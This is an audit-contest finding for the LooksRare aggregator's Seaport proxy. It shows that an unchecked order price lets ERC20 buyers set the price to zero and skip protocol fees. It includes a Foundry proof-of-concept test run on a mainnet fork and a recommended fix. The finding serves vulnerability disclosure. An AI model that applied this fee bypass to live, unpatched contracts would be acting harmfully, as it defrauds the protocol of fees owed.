## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- downgraded by judge
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- M-04

# [Users can avoid paying any fees when using ERC20EnabledLooksRareAggregator for Seaport](https://github.com/code-423n4/2022-11-looksrare-findings/issues/143) 

# Lines of code

https://github.com/code-423n4/2022-11-looksrare/blob/main/contracts/proxies/SeaportProxy.sol#L136-L164
https://github.com/code-423n4/2022-11-looksrare/blob/main/contracts/proxies/SeaportProxy.sol#L232-L252


# Vulnerability details

## Impact
The `order.price` in the parameter `tradeData` is not used as the actual token amount sent to the seaport market and also not checked if those are equal when using the `ERC20EnabledLooksRareAggregator` for `SeaportPorxy` with ERC20 tokens.

So users can set the order.price to ZERO to avoid paying any fees for ERC20 orders.

## Proof of Concept
Test file SeaportUSDCZeroPrice.t.sol, modified from test SeaportProxyERC721USDC.t.sol and annotate with `# diff`.
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IERC20} from "../../contracts/interfaces/IERC20.sol";
import {IERC721} from "../../contracts/interfaces/IERC721.sol";
import {OwnableTwoSteps} from "../../contracts/OwnableTwoSteps.sol";
import {SeaportProxy} from "../../contracts/proxies/SeaportProxy.sol";
import {ERC20EnabledLooksRareAggregator} from "../../contracts/ERC20EnabledLooksRareAggregator.sol";
import {LooksRareAggregator} from "../../contracts/LooksRareAggregator.sol";
import {IProxy} from "../../contracts/interfaces/IProxy.sol";
import {ILooksRareAggregator} from "../../contracts/interfaces/ILooksRareAggregator.sol";
import {BasicOrder, FeeData, TokenTransfer} from "../../contracts/libraries/OrderStructs.sol";
import {TestHelpers} from "./TestHelpers.sol";
import {TestParameters} from "./TestParameters.sol";
import {SeaportProxyTestHelpers} from "./SeaportProxyTestHelpers.sol";

/**
 * @notice SeaportProxy ERC721 USDC orders with fees tests
 */
contract SeaportUSDCZeroPrice is TestParameters, TestHelpers, SeaportProxyTestHelpers {
    LooksRareAggregator private aggregator;
    ERC20EnabledLooksRareAggregator private erc20EnabledAggregator;
    SeaportProxy private seaportProxy;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), 15_491_323);

        aggregator = new LooksRareAggregator();
        erc20EnabledAggregator = new ERC20EnabledLooksRareAggregator(address(aggregator));
        seaportProxy = new SeaportProxy(SEAPORT, address(aggregator));
        aggregator.addFunction(address(seaportProxy), SeaportProxy.execute.selector);

        deal(USDC, _buyer, INITIAL_USDC_BALANCE);

        aggregator.approve(SEAPORT, USDC, type(uint256).max);
        aggregator.setFee(address(seaportProxy), 250, _protocolFeeRecipient);
        aggregator.setERC20EnabledLooksRareAggregator(address(erc20EnabledAggregator));
    }

    function testExecuteWithPriceZero() public asPrankedUser(_buyer) {
        bool isAtomic = true;
        ILooksRareAggregator.TradeData[] memory tradeData = _generateTradeData();
        uint256 totalPrice = 
        // diff
        // not pay the fee for order 0 , so cut 250 bp from total price
        (tradeData[0].orders[0].price * (10250 - 250)) /
        // diff end
            10000 +
            (tradeData[0].orders[1].price * 10250) /
            10000;
        IERC20(USDC).approve(address(erc20EnabledAggregator), totalPrice);
        // diff
        // set order 0 price to ZERO
        tradeData[0].orders[0].price = 0;
        // diff end

        TokenTransfer[] memory tokenTransfers = new TokenTransfer[](1);
        tokenTransfers[0].currency = USDC;
        tokenTransfers[0].amount = totalPrice;

        erc20EnabledAggregator.execute(tokenTransfers, tradeData, _buyer, isAtomic);

        assertEq(IERC721(BAYC).balanceOf(_buyer), 2);
        assertEq(IERC721(BAYC).ownerOf(9948), _buyer);
        assertEq(IERC721(BAYC).ownerOf(8350), _buyer);
        assertEq(IERC20(USDC).balanceOf(_buyer), INITIAL_USDC_BALANCE - totalPrice);
    }

    function _generateTradeData() private view returns (ILooksRareAggregator.TradeData[] memory) {
        BasicOrder memory orderOne = validBAYCId9948Order();
        BasicOrder memory orderTwo = validBAYCId8350Order();
        BasicOrder[] memory orders = new BasicOrder[](2);
        orders[0] = orderOne;
        orders[1] = orderTwo;

        bytes[] memory ordersExtraData = new bytes[](2);
        {
            bytes memory orderOneExtraData = validBAYCId9948OrderExtraData();
            bytes memory orderTwoExtraData = validBAYCId8350OrderExtraData();
            ordersExtraData[0] = orderOneExtraData;
            ordersExtraData[1] = orderTwoExtraData;
        }

        bytes memory extraData = validMultipleItemsSameCollectionExtraData();
        ILooksRareAggregator.TradeData[] memory tradeData = new ILooksRareAggregator.TradeData[](1);
        tradeData[0] = ILooksRareAggregator.TradeData({
            proxy: address(seaportProxy),
            selector: SeaportProxy.execute.selector,
            value: 0,
            maxFeeBp: 250,
            orders: orders,
            ordersExtraData: ordersExtraData,
            extraData: extraData
        });

        return tradeData;
    }
}

```
run test:
```
forge test --match-test testExecuteWithPriceZero -vvvvv
```

## Tools Used
foundry

## Recommended Mitigation Steps
Assert the order price is equal to the token amount of the seaport order when populating parameters.